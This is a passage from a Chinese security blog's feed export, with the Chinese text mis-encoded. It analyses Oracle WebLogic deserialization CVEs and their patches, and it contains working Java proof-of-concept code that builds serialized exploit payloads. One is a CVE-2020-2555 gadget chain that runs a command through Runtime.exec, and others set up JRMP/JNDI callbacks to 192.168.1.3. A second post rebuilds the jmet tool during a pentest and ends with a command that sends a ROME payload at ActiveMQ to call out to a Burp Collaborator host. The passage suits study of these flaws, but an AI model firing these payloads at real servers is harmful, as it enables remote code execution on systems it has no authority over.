<p>é‚£UnicastRefåˆä¸ºå•¥é€ƒè¿‡ä¸€åŠ«ï¼Ÿæˆ‘ä»¬æ¥çœ‹UnicastRefåœ¨åºåˆ—åŒ–çš„æ—¶å€™ç»å†äº†ä»€ä¹ˆã€‚åœ¨ä¸Šé¢çš„payloadä¸­UnicastRefä¼ å…¥äº†RemoteObjectInvocationHandlerï¼ŒRemoteObjectInvocationHandlerç»§æ‰¿è‡ªRemoteObjectã€‚åœ¨RemoteObject writeObjectæ—¶åªæ˜¯å†™å…¥UnicastRefçš„ç±»åï¼ˆå¹¶æ²¡æœ‰æŠŠä»–ä½œä¸ºä¸€ä¸ªç±»åºåˆ—åŒ–ï¼‰ç„¶åè°ƒç”¨UnicastRefçš„writeExternalã€‚<br><img src="1584860540228-fe6c0a00-c540-4adb-ba28-95f78f6c6526.png" alt="image.png"></p>
<p>UnicastRefåˆç”¨åˆ°äº†LiveRefçš„writeï¼Œå†™å…¥äº†ååºåˆ—åŒ–æ—¶éœ€è¦åè¿çš„hostå’Œç«¯å£ã€‚<br><img src="1584860611067-35091a96-92e1-4880-af99-1a41df05c038.png" alt="image.png"></p>
<p><strong><img src="1584860770547-7e1eb9b8-1a60-46df-8176-0babe48b29ec.png" alt="image.png"></strong><br><strong>ç”±æ­¤å¯è§UnicastRefä»å§‹è‡³ç»ˆå¹¶æ²¡æœ‰ä½œä¸ºä¸€ä¸ªç±»è¢«ååºåˆ—åŒ–</strong>ï¼Œå¦‚æœåˆ†æè¿™ä¸ªpayloadçš„resolve<em>æ—¶åºä¼šå‘ç°å®Œå…¨æ²¡æœ‰ååºåˆ—åŒ–UnicastRefã€‚<img src="1584757419567-e05e2bad-6864-4b2a-8808-ea680f0b396a.png" alt="image.png"><br>å¦‚æœä½ åˆ†æåºåˆ—åŒ–å‡ºæ¥çš„æ•°æ®ä¼šå‘ç°*</em>UnicastRef**åªæ˜¯TC_BLOCKDATAè€Œä¸æ˜¯TC_CLASSDESCã€‚<br><img src="1584802424702-8c273e78-5144-4cf4-8508-9791166c0aeb.png" alt="image.png"></p>
<h2 id="CVE-2018-2893çš„ä¿®å¤"><a href="#CVE-2018-2893çš„ä¿®å¤" class="headerlink" title="CVE-2018-2893çš„ä¿®å¤"></a>CVE-2018-2893çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š18å¹´7æœˆ p27919965_1036_Generic<br>è¿™æ¬¡ä¿®å¤æŠŠç»è¿‡resolveClassçš„java.rmi.server.RemoteObjectInvocationHandlerç»™è¿‡æ»¤äº†ã€‚<br><img src="1584757380169-c0e94533-c304-4b2b-92f4-5328df54978c.png" alt="image.png"></p>
<h2 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h2><p>å†æ¬¡å¼•ç”¨@<strong><a href="https://xz.aliyun.com/u/4522">lpwd</a>å¸ˆå‚…çš„è¯ï¼š</strong></p>
<blockquote>
<p>æ ¹æ®å‰é¢çš„åˆ†æå¯çŸ¥ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾ä¸€ä¸ªç±»ä¼¼java.rmi.server.RemoteObjectInvocationHandlerçš„ç±»è¿›è¡Œæ›¿æ¢ï¼Œå°±èƒ½ç»§ç»­ç»•è¿‡äº†ã€‚<br>é‚£ä¹ˆè¿™ä¸ªç±»åº”è¯¥æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š<br>ç»§æ‰¿è¿œç¨‹ç±»ï¼šjava.rmi.server.RemoteObject<br>ä¸åœ¨é»‘åå•é‡Œè¾¹ï¼ˆjava.rmi.activation. ã€sun.rmi.server.ï¼‰<br>éšä¾¿æ‰¾äº†ä¸€ä¸‹ï¼Œç¬¦åˆæ¡ä»¶çš„æŒºå¤šçš„ï¼š<br>javax.management.remote.rmi.RMIConnectionImpl_Stub<br>com.sun.jndi.rmi.registry.ReferenceWrapper_Stub<br>javax.management.remote.rmi.RMIServerImpl_Stub<br>sun.rmi.registry.RegistryImpl_Stub<br>sun.rmi.transport.DGCImpl_Stub</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2018_3245</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(<span class="string">"192.168.1.3"</span>, <span class="number">8080</span>);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        ReferenceWrapper_Stub wrapperStub = <span class="keyword">new</span> ReferenceWrapper_Stub(ref);</span><br><span class="line">        ser(wrapperStub, <span class="string">"CVE_2018_3245.ser"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2018-3245çš„ä¿®å¤"><a href="#CVE-2018-3245çš„ä¿®å¤" class="headerlink" title="CVE-2018-3245çš„ä¿®å¤"></a>CVE-2018-3245çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2018å¹´8æœˆ p28343311_1036_201808Generic<br>ä¿®å¤æ–¹æ³•æ˜¯æ·»åŠ æ›´åº•å±‚çš„java.rmi.server.RemoteObjectã€‚<br><img src="1584798148125-7379c092-e2f9-443f-8ad2-26abcf8c8c47.png" alt="image.png"></p>
<h2 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h2><p>è¿™ä¸ªæ´æ˜¯jndiæ³¨å…¥ã€‚è§¦å‘ç‚¹åœ¨JtaTransactionManagerã€‚<br><img src="1584798618333-e4e39d89-ee25-4e2f-802a-ab5bf2599308.png" alt="image.png"></p>
<p><img src="1584798640381-5944e195-96af-4641-b0a9-cdf087c6a654.png" alt="image.png"></p>
<p><img src="1584798722915-cfb87146-35f9-438d-925c-41a52ae90838.png" alt="image.png"></p>
<p><img src="1584798761013-542d6fd5-8920-4078-9493-4b7c7c5f2741.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2018_3191</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String jndiAddress = <span class="string">"rmi://192.168.1.3:1099/Exploit"</span>;</span><br><span class="line">        JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(jndiAddress);</span><br><span class="line">        ser(jtaTransactionManager, <span class="string">"CVE_2018_3191.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="CVE-2018-3191çš„ä¿®å¤"><a href="#CVE-2018-3191çš„ä¿®å¤" class="headerlink" title="CVE-2018-3191çš„ä¿®å¤"></a>CVE-2018-3191çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2018å¹´8æœˆ p28343311_1036_Generic<br><img src="1584802019155-c6e68f15-42b1-460e-88ef-15ad5ae259dd.png" alt="image.png"></p>
<h2 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h2><p>Oracle Coherenceç»„ä»¶å­˜åœ¨æ¼æ´ï¼Œè¯¥ç»„ä»¶é»˜è®¤é›†æˆåœ¨Weblogic12cåŠä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼ˆç½‘ä¸Šèµ„æ–™è¿™ä¹ˆè¯´çš„ï¼šweb10.3.6ä¹Ÿæœ‰åªæ˜¯é»˜è®¤æ²¡æœ‰å¯ç”¨ï¼ŒæœªéªŒè¯ï¼‰ã€‚<br>è¿™ä¸ªæ¼æ´å’Œcc5çš„æ„é€ æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œè§¦å‘ç‚¹åœ¨BadAttributeValueExpException#readObject ä¸­è°ƒç”¨toStringæ–¹æ³•ã€‚<br><img src="1585031019146-eae01e8a-459f-4c4e-8721-5cf71ee4cf96.png" alt="image.png"><br>åœ¨Coherenceç»„ä»¶ä¸­LimitFilterè¿™ä¸ªç±»åˆšå¥½å¯ä»¥è¢«åºåˆ—åŒ–å¹¶ä¸”æœ‰toStringè¿™ä¸ªæ–¹æ³•ã€‚å› ä¸ºæ˜¯ååºåˆ—åŒ–ï¼Œthis.m_comparatorå’Œthis.m_oAnchorBottoméƒ½å¯æ§ã€‚ä¹Ÿå°±è¯´<code>extractor.extract(``this``.m_oAnchorBottom)</code>å®Œå…¨å¯æ§(æ›´ä¸¥æ ¼çš„è¯´m_comparatoréœ€è¦æ˜¯ValueExtractorçš„å®ä¾‹å¹¶ä¸”å’Œm_oAnchorBottoméƒ½éœ€è¦å¯è¢«åºåˆ—åŒ–)ã€‚<br><img src="1585031243642-c510f34c-79ba-4281-ad7b-7369870e4812.png" alt="image.png"><br>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æœ‰å“ªäº›æ»¡è¶³æ¡ä»¶çš„ç±»å®ç°äº†extractã€‚<br>å¯ä»¥æ³¨æ„åˆ°com.tangosol.util.extractor.ReflectionExtractor#extract<br><img src="1585031717014-721c2395-5fe1-40ce-8d6d-6be6af1b0058.png" alt="image.png"><br>å®ƒå¯ä»¥è¢«åºåˆ—åŒ–å¹¶ä¸”extracté‡Œé¢æ˜¯ä¸€ç»„åå°„æ“ä½œã€‚<br><img src="1585031831736-9700a25a-4236-409c-a8c3-9c6314df0bc3.png" alt="image.png"></p>
<p><img src="1585031809085-a6f41e3e-8971-4416-8ec0-160d44a82f80.png" alt="image.png"><br>å…¶æ¬¡æ³¨æ„åˆ°com.tangosol.util.extractor.ChainedExtractor#extract<br><img src="1585031865174-55287322-bdeb-4ddf-843d-a31557b11098.png" alt="image.png"><br>é‡Œé¢æ˜¯å¯¹extratorè¿›è¡Œé“¾å¼æ“ä½œï¼ˆå¹¶ä¸”è¿™ä¸ªç±»åŒæ ·å¯ä»¥è¢«ååºåˆ—åŒ–ï¼‰ï¼Œè¯´åˆ°è¿™é‡Œå·²ç»å¯ä»¥çœ‹å‡ºæ¥æ˜¯å’Œccé“¾ä¸€ä¸ªå¥—è·¯äº†ã€‚<br><img src="1585031899900-c0d8a1d2-e502-4829-9cf5-bda2bfc7d4c3.png" alt="image.png"></p>
<p>è¿™é‡Œæˆ‘æ˜¯åœ¨windowsä¸Šå¤ç°çš„ï¼ˆ<del>å¾ˆå¥‡æ€ªæˆ‘åœ¨linuxå®Œæ•´å®‰è£…æ‰“ä¸äº†ï¼Œwindowsä¸Šé»˜è®¤å®‰è£…å°±å¯ä»¥ï¼Œ</del>åæ¥å‘ç°linuxç¯å¢ƒæ˜¯7u21è¿™ä¸ªç‰ˆæœ¬çš„BadAttributeValueExpExceptionå¹¶æ²¡æœ‰readObjectæ–¹æ³•ï¼Œå¦å¤–ä¸éœ€è¦ç”¨å®Œæ•´ç¤ºä¾‹å®‰è£…é»˜è®¤å®‰è£…å³å¯ï¼‰ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tangosol.util.ValueExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.filter.LimitFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2020_2555</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//String cmd = "touch /tmp/CVE_2020_2555_12013";</span></span><br><span class="line">        String cmd =<span class="string">"calc.exe"</span>;</span><br><span class="line">        ValueExtractor[] valueExtractors = <span class="keyword">new</span> ValueExtractor[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"invoke"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//new ReflectionExtractor("exec", new Object[]&#123;new String[]&#123;"/bin/bash", "-c", cmd&#125;&#125;)</span></span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"exec"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// chain</span></span><br><span class="line">        LimitFilter limitFilter = <span class="keyword">new</span> LimitFilter();</span><br><span class="line">        limitFilter.setTopAnchor(Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field m_comparator = limitFilter.getClass().getDeclaredField(<span class="string">"m_comparator"</span>);</span><br><span class="line">        m_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_comparator.set(limitFilter, <span class="keyword">new</span> ChainedExtractor(valueExtractors));</span><br><span class="line">        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(<span class="string">"m_oAnchorTop"</span>);</span><br><span class="line">        m_oAnchorTop.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_oAnchorTop.set(limitFilter, Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Field val = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(expException, limitFilter);</span><br><span class="line">        ser(expException, <span class="string">"./CVE_2020_2555_12013.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="CVE-2020-2555çš„ä¿®å¤"><a href="#CVE-2020-2555çš„ä¿®å¤" class="headerlink" title="CVE-2020-2555çš„ä¿®å¤"></a>CVE-2020-2555çš„ä¿®å¤</h2><p>å›¾ç‰‡æ¥è‡ª<a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server">ZDL</a>ï¼ˆä¾µåˆ ï¼‰å¯ä»¥çœ‹åˆ°æ˜¯åˆ äº†extractor.extract<br><img src="1585035027893-70b8222a-14ca-4001-84ce-471b16388b17.png" alt="image.png"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ¢³ç†å®Œä¸€éä¹‹åï¼Œæˆ‘ä»¬å¾—ä»¥çœ‹åˆ°æ•´ä¸ªç»•è¿‡æ€è·¯çš„å…¨è²Œã€‚ç¬”è€…ä¸»è§‚åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µã€‚</p>
<ul>
<li>ç¬¬ä¸€é˜¶æ®µï¼ŒCVE-2016-0638å’ŒCVE-2016-3510ã€‚åˆ©ç”¨ååºåˆ—åŒ–æµç¨‹ä¸­æ–°newçš„åŸç”Ÿoisç»•è¿‡ï¼Œåªè¦æ‰¾åˆ°äº†read*ç³»åˆ—çš„ç‚¹å¯ä»¥æ¯”è¾ƒå®¹æ˜“çš„çœ‹å‡ºæ¥ã€‚</li>
<li>ç¬¬äºŒé˜¶æ®µï¼Œcve-2017-3248åˆ°cve-2018-3191ã€‚åˆ©ç”¨jrmpã€jndiå¸¦å¤–rceï¼Œæ¼æ´ç‚¹æ²¡æœ‰åœ¨read*çš„ä»£ç ä¸Šä¸‹æ–‡ä¸­éœ€è¦å¤šè·Ÿå‡ æ­¥æœ‰ç‚¹â€œpopâ€çš„æ„Ÿè§‰äº†ã€‚</li>
<li>ç¬¬ä¸‰é˜¶æ®µï¼Œcve-2020-2555ï¼Œéœ€è¦å¯¹javaçš„ååºåˆ—åŒ–å‡ºç°è¿‡çŸ¥è¯†ç‚¹å¾ˆç†Ÿæ‚‰ï¼ˆjavaåŸç”Ÿç±»çš„è§¦å‘ç‚¹+weblogicç»„ä»¶ä¸­ç±»ä¼¼ccçš„å¥—è·¯ï¼‰ï¼Œæ®è¯´è¿™ä¸ªæ¼æ´çš„ä½œè€…ä¹ŸæŒ–äº†å¾ˆä¹…ã€‚</li>
</ul>
<p><strong>ç¢äºç¬”è€…æ°´å¹³ï¼Œè¡Œæ–‡å‡ºé”™åœ¨æ‰€éš¾å…ï¼Œå¦‚æœ‰é˜…è¯»æ­¤æ–‡çš„å¸ˆå‚…å‘ç°é”™è¯¯è¿˜è¯·ä¸åæŒ‡æ­£ã€‚</strong></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.anquanke.com/post/id/162782">ä»WebLogicçœ‹ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ä¸é˜²å¾¡</a><br><a href="https://www.jianshu.com/p/411e18ceaa55">Java åºåˆ—åŒ–ä¹‹ Externalizable</a><br><a href="https://seaii-blog.com/index.php/2019/12/29/92.html">Weblogicæ¼æ´è°ƒè¯•ç¬”è®°</a><br><a href="https://wooyun.js.org/drops/%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6%E5%BC%80%E6%94%BEHTTPS%E6%9C%8D%E5%8A%A1%E7%9A%84weblogic%E6%9C%8D%E5%8A%A1%E5%99%A8.html">å¦‚ä½•æ§åˆ¶å¼€æ”¾HTTPSæœåŠ¡çš„weblogicæœåŠ¡å™¨</a><br><a href="https://y4er.com/post/weblogic-cve-2016-0638/">Weblogic CVE-2016-0638 StreamMessageImplååºåˆ—åŒ–ç»•è¿‡åˆ†æ</a><br><a href="https://www.databaseusers.com/article/6108629/Patch+S8C2+is+mutually+exclusive+and+cannot+coexist+with+patch(es)%3A+ZLNA%2CEJUW">Patch S8C2 is mutually exclusive and cannot coexist with patch(es): ZLNA,EJUW</a><br><a href="https://xz.aliyun.com/t/2479">Weblogic JRMPååºåˆ—åŒ–æ¼æ´å›é¡¾</a><br><a href="https://www.anquanke.com/post/id/152164">CVE-2018-2893ï¼šOracle WebLogic Server è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æé¢„è­¦</a><br><a href="https://nosec.org/home/detail/4314.html">æ¼«è°ˆ Weblogic CVE-2020-2555</a><br><a href="https://paper.seebug.org/1141/">Oracle Coherence ååºåˆ—åŒ–æ¼æ´åˆ†æï¼ˆCVE-2020-2555ï¼‰</a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>é‡æ–°ç¼–è¯‘jmetå°è®°</title>
    <url>/2020/03/21/%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91jmet%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<!-- åœ¨ä¸€æ¬¡æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå‘ç°å†…ç½‘æœ‰ä¸€äº›activemqç‰ˆæœ¬å¾ˆè€å®˜ç½‘çš„jmetæ‰“ä¸äº†éœ€è¦é‡æ–°ç¼–è¯‘ï¼Œè¸©äº†ä¸€äº›å‘ã€‚ -->
<!-- more -->

<p>åœ¨ä¸€æ¬¡æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå‘ç°å†…ç½‘æœ‰ä¸€äº›activemqç‰ˆæœ¬å¾ˆè€ï¼ˆ2010å¹´å‰çš„ï¼‰ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰/fileserverè¿™ä¸ªè·¯å¾„æ„å‘³ç€æ²¡æ³•ç”¨<strong>CVE-2016-3088ï¼ˆçŒœæµ‹ç»è¿‡åŠ å›ºï¼‰ï¼Œ</strong>ä¸è¿‡å¹¸è¿çš„æ˜¯/adminæ²¡æœ‰æˆæƒå°±èƒ½è®¿é—®æ„å‘³ç€æœ‰ä¸»åŠ¨è§¦å‘CVE-2015-5254çš„å¯èƒ½æ€§ï¼ŒçŒœæµ‹è¿™ç§åé—¨çš„javaæ´å¯èƒ½è¢«åŠ å›ºäººå‘˜å¿½ç•¥ï¼Œæ‰€ä»¥æŠ„èµ·<a href="https://github.com/matthiaskaiser/jmet">jmet</a>è¯•äº†ä¸€ä¸‹ã€‚å›æ˜¾å¦‚ä¸‹<br><img src="1584789659269-eb4f1985-8c8f-4eae-88b5-cb4d8218eeb6.png#align=left&display=inline&height=138&name=image.png&originHeight=276&originWidth=1490&size=297008&status=done&style=none&width=745" alt="image.png"></p>
<p>çœ‹æ ·å­æ˜¯å¤±è´¥äº†ï¼Œç»è¿‡ä¸€ç•ªè°·æ­Œè¿‡åçœ‹åˆ°githubä¸Šæœ‰å¦‚ä¸‹å›ç­”ï¼ŒçŒœæµ‹æ˜¯å› ä¸ºactivemqæ‰€ä¾èµ–çš„åŒ…ç‰ˆæœ¬è¿‡è€è€Œjmetä¾èµ–çš„åŒ…æ¯”è¾ƒæ–°æ‰€ä»¥æ‰“ä¸æˆåŠŸã€‚<br><img src="1583215074318-58d2e7e5-d8c1-42a2-bf8d-cca000abff11.png#align=left&display=inline&height=125&name=image.png&originHeight=250&originWidth=2076&size=224257&status=done&style=none&width=1038" alt="image.png"><br><img src="1583215080926-c3b83bc4-a741-487e-aea7-014ae6e5c411.png#align=left&display=inline&height=139&name=image.png&originHeight=278&originWidth=1568&size=121245&status=done&style=none&width=784" alt="image.png"></p>
<p>æ­£å¦‚githubä¸Šè¿™ä¸ªè€å¤–æ‰€è¯´éœ€è¦åŠ å…¥legacyã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;activemq-openwire-legacy&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;5.15.11&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶é—®é¢˜é—®é¢˜å‡ºåœ¨ä¾èµ–ä¸Šå°±æ„å‘³ç€è¦é‡æ–°ç¼–è¯‘ï¼Œè¸©äº†ä¸€äº›å‘ä¸‹é¢è®°å½•ä¸€ä¸‹ã€‚</p>
<p>jmetå¯ä»¥æ”»å‡»å¤šç§è½¯ä»¶ï¼Œæœ‰ä¸€äº›æ˜¯å•†ä¸šçš„è½¯ä»¶æˆ‘ä»¬æä¸åˆ°å¯¹åº”çš„jarï¼Œæ‰€ä»¥åˆ é™¤ä¸‹é¢ä¸¤ä¸ªjavaã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rm -f src/main/java/de/codewhite/jmet/target/impl/WebSphereMQTarget.java</span><br><span class="line">rm -f src/main/java/de/codewhite/jmet/target/impl/SwiftMQTarget.java</span><br></pre></td></tr></table></figure>

<p>å¦å¤–æ³¨æ„åˆ°jmetæ˜¯ä¾èµ–äºysoserial<br><img src="1584790845997-06ed872f-c5d6-4f4d-b6c4-a8ccc65de4d6.png#align=left&display=inline&height=201&name=image.png&originHeight=200&originWidth=742&size=25701&status=done&style=none&width=746" alt="image.png"></p>
<p>å¹¶ä¸”æˆ‘ä»¬åç»­ä¹Ÿä¼šç”¨åˆ°ï¼Œå¥ˆä½•æ²¡æ‰¾åˆ°ä»€ä¹ˆä¸­å¤®ä»“åº“æä¾›è¿™ç§é»‘å®¢ä¾èµ–ã€‚æ— å¥ˆéœ€è¦è‡ªå·±åˆ°å¯¼å…¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mvn install:install-file -DgroupId=ysoserial -DartifactId=ysoserial -Dversion=<span class="number">0.0</span><span class="number">.5</span>-SNAPSHOT -Dpackaging=jar -Dfile=</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">export MAVEN_OPTS=-Xss10m</span><br><span class="line">mvn clean compile assembly:single</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¯ä»¥å¿«ä¹çš„ä¸€é”®getshelläº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxychains java -jar jmet<span class="number">-0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"ping -n 1 wyyekrec31qzxtpc4kq636jbi2otci.burpcollaborator.net"</span> -Yp ROME  ip port</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>linuxä¸‹javaååºåˆ—åŒ–é€šæ€å›æ˜¾æ–¹æ³•çš„ä½é…ç‰ˆå®ç°</title>
    <url>/2020/02/24/linux%E4%B8%8Bjava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%8E%E9%85%8D%E7%89%88%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<!-- å…¶å®è¿™ä¸ªæ€è·¯è·ç¦»å®ç°æ ‡é…ç‰ˆçš„æ•ˆæœå°±ä¸€æ­¥ä¹‹é¥äº†ï½ -->
<!-- more -->

<p><a href="https://xz.aliyun.com/t/7307">é¦–å‘äºå…ˆçŸ¥è½¬è½½åˆ°è‡ªå·±åšå®¢</a></p>
